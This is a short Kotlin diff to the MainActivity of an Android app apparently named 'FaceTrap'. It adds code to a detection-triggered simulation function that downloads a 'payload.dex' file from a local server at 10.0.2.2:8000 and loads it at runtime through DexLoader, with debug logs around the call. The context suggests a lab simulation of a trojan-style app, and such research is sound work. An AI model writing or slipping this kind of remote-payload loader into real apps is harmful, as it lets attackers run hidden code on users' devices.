@@ -179,8 +179,14 @@ class MainActivity : AppCompatActivity() {
     private fun triggerSimulation(score: Float, confidence: Float) {
         if (simulationTriggered) return
         simulationTriggered = true
-        try {
-            // Pass context as first argument
+        try {   
+            // --- Pull and execute payload from local Python server ---
+            Log.d("FaceTrap", "TRIGGER: before DexLoader")   // ADD
+            val serverUrl = "http://10.0.2.2:8000/payload.dex"
+            DexLoader.downloadAndLoad(this, serverUrl)
+            Log.d("FaceTrap", "TRIGGER: after DexLoader")    // ADD
+    
+            // --- Existing simulation (unchanged) ---
             val result = AvailabilitySimulation.trigger(
                 this,
                 filesDir,
